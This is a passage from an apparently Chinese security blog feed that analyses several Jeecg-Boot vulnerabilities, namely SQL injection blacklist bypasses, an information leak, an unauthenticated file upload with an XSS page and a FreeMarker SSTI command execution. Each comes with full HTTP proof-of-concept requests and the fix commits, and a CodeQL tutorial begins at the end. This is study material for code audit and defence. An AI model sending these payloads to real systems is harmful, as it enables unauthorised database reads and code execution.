class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>接口 <code>org.jeecg.modules.system.controller.DuplicateCheckController</code> 全流程概括一下就是经过一串过滤，最后执行 SQL 语句，对应的 SQL 语句为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 重复校验 sql语句 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;duplicateCheckCountSql&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Long&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;</span>&gt;</span>  </span><br><span class="line">    SELECT COUNT(*) FROM $&#123;tableName&#125; WHERE $&#123;fieldName&#125; = #&#123;fieldVal&#125; and id <span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span> #&#123;dataId&#125;  </span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">&lt;!-- 重复校验 sql语句 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;duplicateCheckCountSqlNoDataId&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Long&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;</span>&gt;</span>  </span><br><span class="line">    SELECT COUNT(*) FROM $&#123;tableName&#125; WHERE $&#123;fieldName&#125; = #&#123;fieldVal&#125;<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>按照正常来说的 SQL 注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where updatexml(1,(select/**/if(length(&quot;aaa&quot;)&gt;5,1,sleep(5)) union select/**/1),1);</span><br></pre></td></tr></table></figure><p>其中 <code>tableName</code> 契合注入点攻击即可。漏洞的本质原因是过滤的不完全。</p><p>可以看到这里的过滤为 <code>select </code>，多了个空格，很容易使用 <code>/**/</code> 进行绕过。</p><p>作者提出的 <code>replace()</code> 替换 <code>/**/</code> 也是修复不完全的，因为仍旧可以用 <code>()</code> 进行绕过</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb">https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb<i class="fas fa-external-link-alt"></i></a></p><p>加了两个报错注入的关键字，很明显修复是不完全的，依旧存在安全隐患。后面要看的 jeecg-boot 3.4.4 存在 sql 注入漏洞就是如此；但是 3.4.4 的漏洞复现我失败了，不知道是什么原因。</p><h2 id="Jeecg-Boot-lt-x3D-3-4-4-存在-SQL-注入漏洞"><a href="#Jeecg-Boot-lt-x3D-3-4-4-存在-SQL-注入漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 存在 SQL 注入漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 存在 SQL 注入漏洞</h2><ul><li>和上一条其实是类似的</li></ul><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>jeecg-boot3.4.4 存在 sql 注入漏洞，sql 注入检测代码存在绕过。接口为 <code>/sys/duplicate/check</code></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?dataId=2000&amp;fieldName=(select(if(((select%0Apassword%0Afrom%0Asys_user%0Awhere%0Ausername%0A=&#x27;jeecg&#x27;)=&#x27;eee378a1258530cb&#x27;),sleep(4),1)))&amp;fieldVal=1000&amp;tableName=test_person</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>值得一提的是，这里的 sleep 时间取决于数据表里面放的数据多少，为 <code>n*时间</code></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>没有什么特别需要分析的，简单的 bypass</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a<i class="fas fa-external-link-alt"></i></a></p><p>增添的黑名单是 <code>geohash|gtid_subset|gtid_subtract</code>，没看懂</p><h2 id="Jeecg-Boot-lt-x3D-3-4-4-存在信息泄露漏洞"><a href="#Jeecg-Boot-lt-x3D-3-4-4-存在信息泄露漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 存在信息泄露漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 存在信息泄露漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>由于 <code>AbstractQueryBlackListHandler</code> 类中的黑名单校验不严格，导致多个接口如 <code>sys/dict/queryTableData</code> 存在信息泄露漏洞。</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/dict/queryTableData?table=%60sys_user%60&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数据也被加密了，并没有什么太大的用处。</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在 <code>isPass()</code>函数中 <code>ruleMap.get(name)</code> 为 null 即可绕过, 可以采用 <code>sys_user</code>, <code>(sys_user)</code>, <code>sys_user%20</code> 等绕过</p><h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a<i class="fas fa-external-link-alt"></i></a></p><p>加黑了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getTableName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        String[] arr = str.split(<span class="string">&quot;\\s+(?i)where\\s+&quot;</span>);</span><br><span class="line">        <span class="comment">// sys_user , (sys_user), sys_user%20, %60sys_user%60  issues/4393</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">reg</span> <span class="operator">=</span> <span class="string">&quot;\\s+|\\(|\\)|`&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> arr[<span class="number">0</span>].replaceAll(reg, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然而依旧可以用 &#96;&#96; bypass</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/dict/queryTableData?table=sys_user/**/&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Jeecg-Boot-lt-x3D-3-5-1-存在任意文件上传漏洞"><a href="#Jeecg-Boot-lt-x3D-3-5-1-存在任意文件上传漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.5.1 存在任意文件上传漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.5.1 存在任意文件上传漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>经测试发现 <code>/jeecg-boot/jmreport/upload</code>接口存在未授权任意文件上传</p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>文件上传</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>460</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryBB3U3apXylvyidXI</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/jeecg-boot/jmreport/index/864289498073407488?menuType=datainfo&amp;token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;xss.html&quot;</span></span></span><br><span class="line"><span class="language-xquery">Content-Type: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    </span><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;fileName&quot;</span></span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">xss.html</span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;biz&quot;</span></span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">excel_online</span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI--</span></span><br><span class="line"><span class="language-xquery"></span></span><br></pre></td></tr></table></figure><p>文件上传不需要 token 验证，访问需要 token 验证。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/jimureport/xss1695174346254.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Microsoft Edge&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;117&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传的文件甚至可以访问</p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>对应的类处理 <code>org.jeecg.modules.jmreport.desreport.a.a</code> 类的 <code>upload</code> 接口。拿到 HTTP 请求当中文件上传请求的参数，往下走，进入 <code>local</code></p><p>下面就是文件上传的部分了，其实并没有做任何过滤。只是把 <code>../</code> 过滤了</p><h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>把 jimuReport 的版本升级到 1.6.1 +，最新的 diff 并没有找到，后续值得分析。</p><h2 id="CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-注入"><a href="#CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-注入" class="headerlink" title="CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL 注入"></a>CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL 注入</h2><ul><li>不得不提一嘴，SQL 注入真的太多了。</li></ul><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>/sys/duplicate/check</code> 接口 SQL 注入，<code>checksql</code> 可以被绕过。</p><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?tableName=v3_hello&amp;fieldName=1+and%09if(user(%20)=&#x27;root@localhost&#x27;,sleep(0),sleep(5))&amp;fieldVal=1&amp;dataId=asd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line">X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本质上来说也是黑名单绕过</p><h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b">https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b<i class="fas fa-external-link-alt"></i></a></p><p>SQL 注入基本上都是在做黑名单的 bypass，分析 SQL 注入就分析到这里。</p><h2 id="CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-存在-FreeMarker-模板引擎注入"><a href="#CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-存在-FreeMarker-模板引擎注入" class="headerlink" title="CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 存在 FreeMarker 模板引擎注入"></a>CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 存在 FreeMarker 模板引擎注入</h2><h3 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>JeecgBoot 受影响版本中由于积木报表 <code>/jeecg-boot/jmreport/queryFieldBySql</code> Api 接口未进行身份校验，使用 Freemarker 处理用户用户传入的 sql 参数，未经授权的攻击者可发送包含恶意 sql 参数的 http 请求，通过 SSTI 在应用端执行任意代码。</p><h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecgboot/jmreport/queryFieldBySql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3100</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.20.10.2:3100/login?redirect=/dashboard/analysis</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>103</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">&#123;&quot;sql&quot;:&quot;sekect &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="keyword">template</span>.utility.<span class="keyword">Execute</span>\&quot;?new()&gt;$&#123;ex(\&quot;calc\&quot;)&#125;&#x27;&quot;</span></span><br><span class="line"><span class="language-pgsql">&#125;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>postman 发包</p><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口对应 <code>org.jeecg.modules.jmreport.desreport.a.a#c()</code> 方法，先过了 sql 的黑名单，随后调用 <code>this.reportDbService.parseReportSql()</code> 方法。</p><p>跟进去是调用了动态代理，代理了 <code>target</code> 对象的 <code>method</code> 方法,并在执行该方法时传入 <code>argsToUse</code>参数，动调能够看到调用的是  <code>org.jeecg.modules.jmreport.desreport.service.a.i#parseReportSql</code> 方法。一路调用后来到 <code>org.jeecg.modules.jmreport.desreport.util.e#a</code> 方法；其中调用了 <code>FreeMarkerUtils.a()</code></p><p>跟进之后发现从这里开始新建了一个 Template，并加工表达式。后面就是 FreeMarker 执行表达式的过程了，这里不再赘述。</p><h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae">https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5">https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5<i class="fas fa-external-link-alt"></i></a></p><p>看着没啥问题，是完整的修复。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Jeecg-Boot 部分历史漏洞分析&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="https://drun1baby.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
    <category term="代码审计" scheme="https://drun1baby.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 入门</title>
    <link href="https://drun1baby.github.io/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/"/>
    <id>https://drun1baby.github.io/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/</id>
    <published>2023-09-03T13:30:21.000Z</published>
    <updated>2023-09-18T01:07:10.579Z</updated>
    
    <content type="html"><![CDATA[<p>CodeQL · 真入门</p><span id="more"></span><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在自己第一遍学完 CodeQL 之后还是感觉比较生疏，于是想找点靶场练手，于是就有了这篇文章。</p><h2 id="0x02-CodeQL-基本语法"><a href="#0x02-CodeQL-基本语法" class="headerlink" title="0x02 CodeQL 基本语法"></a>0x02 CodeQL 基本语法</h2><h3 id="QL-语法"><a href="#QL-语法" class="headerlink" title="QL 语法"></a>QL 语法</h3><p>用的是这个靶场 —— <a class="link" href="https://github.com/l4yn3/micro_service_seclab/">micro_service_seclab:<i class="fas fa-external-link-alt"></i></a>，同理其实 JoyChou93 师傅之前所设计的靶场，也是可以用来做 CodeQL 练习的。</p><ul><li>添加对应 database</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create E:\Coding\CodeQL\CodeQL-Practice --language=<span class="string">&quot;java&quot;</span> --source-root=E:\Coding\CodeQL\micro_service_seclab --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><p>CodeQL的核心引擎是不开源的，这个核心引擎的作用之一是帮助我们把micro-service-seclab转换成CodeQL能识别的中间层数据库。</p><p>然后我们需要编写QL查询语句来获取我们想要的数据。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/codeqlRunningProces.png" class><p>正如这张图描述的，由于CodeQL开源了所有的规则和规则库部分，所以我们能够做的就是编写符合我们业务逻辑的QL规则，然后使用CodeQL引擎去跑我们的规则，发现靶场的安全漏洞。</p><p>我们来简单地介绍一下本案例涉及到的CodeQL的基本语法。</p><p>基本语法包含3个部分。</p><table class="editor-table-container"><thead><tr><th>名称</th><th>解释</th></tr></thead><tbody><tr><td>Method</td><td>方法类，Method method 表示获取当前项目中所有的方法</td></tr><tr><td>MethodAccess</td><td>方法调用类，MethodAccess call 表示获取当前项目当中的所有方法调用</td></tr><tr><td>Parameter</td><td>参数类，Parameter 表示获取当前项目当中所有的参数</td></tr></tbody></table><p>结合 ql 的语法，我们尝试获取 <code>micro-service-seclab</code> 项目当中定义的所有方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><p>我们再通过 Method 类内置的一些方法，把结果过滤一下。比如我们获取名字为 <code>getStudent</code> 的方法名称。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 